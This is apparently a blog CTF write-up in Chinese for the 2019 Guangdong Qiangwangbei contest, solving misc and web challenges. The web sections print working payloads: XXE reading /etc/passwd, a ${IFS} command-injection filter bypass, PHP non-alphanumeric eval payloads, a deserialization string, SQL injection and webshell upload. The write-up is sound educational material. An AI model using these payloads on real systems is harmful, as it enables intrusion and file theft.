---
title: 2019广东省强网杯writeup
index_img: /img/2019-09-11/index.png
date: 2019-09-11 09:48:43
tags: 
- web
- misc
- writewp
---
这个比赛是想好好打的，第一天还好，项目做完了专心打了大半天，下午到快晚上的时候又有事情，导致后面就大概看了一下，没有怎么投入，不过这次比赛~~脑洞~~难度不算太大，做的还算不错。
<!--more-->
##### misc
###### 完美的错误

题目描述：小明在实现避免字符混淆的编码算法时,不小心错位了数组，你能帮他还原代码吗？`RJv9mjS1bM9MZafGV77uTyDaapNLSk6t358j2Mdf1pbCByjEiVpX`
关键点：避免字符混淆
这个提示是与base58编码有关，base58与base64的区别参考先知社区的一篇文章-->[传送门](https://xz.aliyun.com/t/2255)
错位了数组应该是数字和字母换了位置，直接用哪里的代码改一下就出来了
```python
#-*-coding:utf-8
__b58chars = 'ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz123456789' #这里原本是123456789A-Za-z的
__b58base = len(__b58chars)


def b58encode(v):
    """ encode v, which is a string of bytes, to base58.
    """

    long_value = int(v.encode("hex_codec"), 16)

    result = ''
    while long_value >= __b58base:
        div, mod = divmod(long_value, __b58base)
        result = __b58chars[mod] + result
        long_value = div
    result = __b58chars[long_value] + result

    # Bitcoin does a little leading-zero-compression:
    # leading 0-bytes in the input become leading-1s
    nPad = 0
    for c in v:
        if c == '\0':
            nPad += 1
        else:
            break

    return (__b58chars[0] * nPad) + result


def b58decode(v):
    """ decode v into a string of len bytes
    """

    long_value = 0L
    for (i, c) in enumerate(v[::-1]):
        long_value += __b58chars.find(c) * (__b58base ** i)

    result = ''
    while long_value >= 256:
        div, mod = divmod(long_value, 256)
        result = chr(mod) + result
        long_value = div
    result = chr(long_value) + result

    nPad = 0
    for c in v:
        if c == __b58chars[0]:
            nPad += 1
        else:
            break

    result = chr(0) * nPad + result
    return result

if __name__ == "__main__":
    # print  b58encode("hello world")
    print  b58decode("RJv9mjS1bM9MZafGV77uTyDaapNLSk6t358j2Mdf1pbCByjEiVpX")
```
flag{adb88f7b70a20983833a7615fb103e01}
###### 撸啊撸
用winhex搜索png文件尾发现后面多了东西，提取出来后发现是一段程序，但是文件头损坏了，`__mh_execute_header`、`/usr/lib/libSystem.B.dylib`这些都是mach-o的可执行文件格式~~别问我为什么知道，都是大佬发现的，我只是个复读机~~，修复文件头如下，找到一个有例子的文章可以参考-->[传送门](https://www.jianshu.com/p/07f361f6e0d0)
![](/img/2019-09-11/img_1.png)![](/img/2019-09-11/img_2.png)
程序关键伪代码如下
```c
#start
__int64 start()
{
  __int64 result; // rax
  char v1; // [rsp+10h] [rbp-30h]
  __int64 v2; // [rsp+38h] [rbp-8h]

  strcpy(&v1, "938gce1`872db99db`b342d23c0g9g2d");
  if ( v1 == 48 )
    sub_100000E40(&v1);
  result = __stack_chk_guard;
  if ( __stack_chk_guard == v2 )
    result = 0LL;
  return result;
}
#sub_100000E40
int __fastcall sub_100000E40(const char *a1)
{
  int i; // [rsp+14h] [rbp-Ch]

  for ( i = 0; i < strlen(a1); ++i )
    a1[i] ^= 1u;
  return printf("flag为:%s\n", a1);
}
```
```python
code = '938gce1`872db99db`b342d23c0g9g2d'
text = ''
for i in code:
    text += chr(ord(i)^1)
print text
#829fbd0a963ec88ecac253e32b1f8f3e
```
flag{829fbd0a963ec88ecac253e32b1f8f3e}
###### 脑筋急转弯
下载回来是一个wav音频文件，没发现摩斯频谱也没发现什么就卡住了，后来队友说用`SilentEye`可以提取出一个zip文件~~我去还有这操作~~
![](/img/2019-09-11/img_3.png)
然后爆破出密码
![](/img/2019-09-11/img_4.png)
得到一堆012012012又卡住了，后来某位大佬把0->`.`,1->`!`,2->`?`然后得到`Ook`码，然后`Ook`转`Brainfuck`转`text`然后就解出来了O_o..(空格要去掉)
```
lalala,wo shi mai bao de xiao hang jia.flag{08277716193eda6c592192966e9d6f39} ni neng cai dao ta me?
```
flag{08277716193eda6c592192966e9d6f39}

##### web
###### 小明又被拒绝了
题目描述：小明又被拒绝了，你能帮助他吗？
抓包添加请求头`X-Forwarded-For: 127.0.0.1`和把admin改为1
![](/img/2019-09-11/img_5.png)
flag{xxasdasdd_for}
###### XX?
题目描述：XXXXX？？？
联想到XXE，扫描得到`index.php`和`flag.php`文件，扫描备份文件得到`index.php~`文件
```php
<?php
#鍏抽棴Warning
error_reporting(E_ALL^E_NOTICE^E_WARNING);

$xmlfile = file_get_contents('php://input');
$dom = new DOMDocument();
$dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);

$creds = simplexml_import_dom($dom);
$user = $creds->user;
$pass = $creds->pass;

echo "CTF:" . "<br>" . "$user";
?>
```
POST上去一个xxe的payload
```xml
<?xml version="1.0"?>
<!DOCTYPE note[
<!ELEMENT note (user)>
<!ENTITY hack3r "Hu3sky">
]>
<note>
<user>&hack3r;</user>
</note>
```
![](/img/2019-09-11/img_6.png)
成了，有戏，试着读了一下`/etc/passwd`文件
![](/img/2019-09-11/img_7.png)
ok,已经可以任意文件读取了
尝试读取flag.php的时候发现一直读取失败，百思不得其解，web访问也的确存在，队友用php伪协议拿到了
![](/img/2019-09-11/img_8.png)
flag{IUyasd8213123123890}

###### 免费的,ping一下~
题目描述：听说ping很好玩~
考察命令执行，过滤了`<`，`>`，`&`，`|`，`空格`，`%0*`，还有一些关键字可以用拼接的方法绕过，可以用`${IFS}`替换空格，`$a=ca;$b=t;$a$b`这样的方法来绕过关键字，然后这道题用cat是cat不到flag的，返回的内容有限，所以查到可以用sed查看指定的行
```
A=;a=fl;b=ag;se""d${IFS}-n${IFS}'16,18p'${IFS}/$a$b
```
![](/img/2019-09-11/img_9.png)
flag{llllll_U_GeT_Th3_fl4g}
###### php
题目描述：PHP是世界上最.....的语言
扫描得到`index.php`
```php
<?php
error_reporting(E_ALL^E_NOTICE^E_WARNING);
function GetYourFlag(){
    echo file_get_contents("./flag.php");
}

if(isset($_GET['code'])){
    $code = $_GET['code'];
    //print(strlen($code));
    if(strlen($code)>27){ 
        die("Too Long.");
    }

    if(preg_match('/[a-zA-Z0-9_&^<>"\']+/',$_GET['code'])) {
        die("Not Allowed.");
    }
    @eval($_GET['code']);
}else{
      highlight_file(__FILE__);
}
?>
```
这是一个无字符马，可以参考freebuf上的一篇文章-->[传送门](https://www.freebuf.com/articles/web/186298.html)，这是php7的一个解析特性，简单来说就是通过和`~`符号异或出我们需要的字符。
```
(~%8F%97%8F%96%91%99%90)();
```
这个是phpinfo();的一个payload，可以看到webshell是可以成功执行的
![](/img/2019-09-11/img_10.png)
然后上面也给了getflag的函数我们，直接调用就可以了
```php
<?php
$a = urlencode(~'GetYourFlag');
echo $a;
//%B8%9A%8B%A6%90%8A%8D%B9%93%9E%98
```
payload为`(~%B8%9A%8B%A6%90%8A%8D%B9%93%9E%98)();`
![](/img/2019-09-11/img_11.png)
flag{3904c5df2e894ca02a21004feb21e617}
备注：php是世界上最好的语言hah
###### API
题目描述：API
打开提示`Api!wow`，访问api目录提示
![](/img/2019-09-11/img_12.png)
提示`post filename`和传入一个数组，不赋值时候提示`json_decode error`,固传入一个json数组，盲猜file参数。结果正确
![](/img/2019-09-11/img_13.png)
在这里浪费了很多时间来绕过stristr，发现是绕不过的。然后读取../index.php
![](/img/2019-09-11/img_14.png)
得到源码，看了下，是反序列化。把hack.php也读出来
![](/img/2019-09-11/img_15.png)
看来没错了。通过反序列化来读取fffffaa_not.php这个文件源码。([小声bb](https://www.freebuf.com/articles/web/167721.html):[全都是网上原题](https://www.cnblogs.com/pureqh/p/10161993.html?tdsourcetag=s_pctim_aiomsg))
通过../index.php的过滤条件可以构造出反序列化的字符串
```
O:+4:"hack":1:{s:4:"file";s:15:"fffffaa_not.php";}
```
发送的时候需要url编码一下。然后得到源码fffffaa_not.php
![](/img/2019-09-11/img_16.png)
是一个写shell的功能。其中判断规则preg_match('[<>?]', $text)。
这个绕过很简单了，变成数组就可以了。参考-->[传送门](https://blog.stkusami.com/archives/56)
![](/img/2019-09-11/img_17.png)
成了，直接getshell拿flag
![](/img/2019-09-11/img_18.png)
flag{Oiahhh1_iiu123}
###### 找漏洞
题目描述：小明失恋后写了一个CMS，你能帮他找找漏洞吗？
这道题大佬做出来了，我就学习一波。
根据题目给出的源码包，程序是laravel 框架写的，这套框架和Django的编程思想差不多。不懂的可以先去看看 laravel 框架的设计逻辑。
首先审计一下路由有什么可以用的。
![](/img/2019-09-11/img_19.png)
可以看到有5个路由。漏洞入口点是第一个路由user_testpage/{id}，其余的都要登陆后才能使用。在App\Http\Controllers\UserController 里面的index方法。
![](/img/2019-09-11/img_20.png)
可以看到有个注入，只是简单的替换了关键字。直接sqlmap跑。Dump出数据
![](/img/2019-09-11/img_21.png)
可以看到有3条数据。刚开始尝试了暴力破解等方法。都没成功。随后在github上找了hash对比的工具，刚开始并不顺利，全部hash都是false。接着翻源码的时候意外发现一个password，在\backup\database\factories\UserFactory.php
![](/img/2019-09-11/img_22.png)
总感觉后面的注释是密码。一试果然成功。数据库里面前两个的password都是假的……
![](/img/2019-09-11/img_23.png)
登陆后台之后，就直接跳到上传吧
![](/img/2019-09-11/img_24.png)
首先带着cookie访问`http://119.61.19.212:8085/home/uploadto_upload`，会得到一个html
![](/img/2019-09-11/img_25.png)
意思是按照这个格式构造上传包。这里需要改改。Action填入的是`http://119.61.19.212:8085/home/uploadss/NotAllow6171`,`files`标签也要改。改成符合上传包的格式,这里需要注意`uploadss`后面是需要跟一个key，key从哪里来?回头看看数据库第二条。
![](/img/2019-09-11/img_26.png)
~~首先这里……十分恶心~~。刚开始一直以为上传点是不行的。然后我在源码注意到了`template.blade.php`。才把文件名改成template.blade.php 。然后在哪触发呢？blade框架中是类似于一个模板，需要在Controller中用view的方法展现。所以刚好ProfileController.php 中view了。所以就可以通过此方法覆盖php文件啦
![](/img/2019-09-11/img_27.png)
但是回到上传那里，虽然不拦截后缀。却不能上传新文件，也不能覆盖php代码进去，所以这里可以利用框架特性。template.blade.php是个模板文件。有特有的语法。经别人点化后在源码中其实有一个文件读取
![](/img/2019-09-11/img_28.png)
这个怎么用呢，看下图吧
![](/img/2019-09-11/img_29.png)
构造post包发送
![](/img/2019-09-11/img_30.png)
访问`http://119.61.19.212:8085/home/profile`出flag
![](/img/2019-09-11/img_31.png)
flag{Ucan_wow_easy_qaq}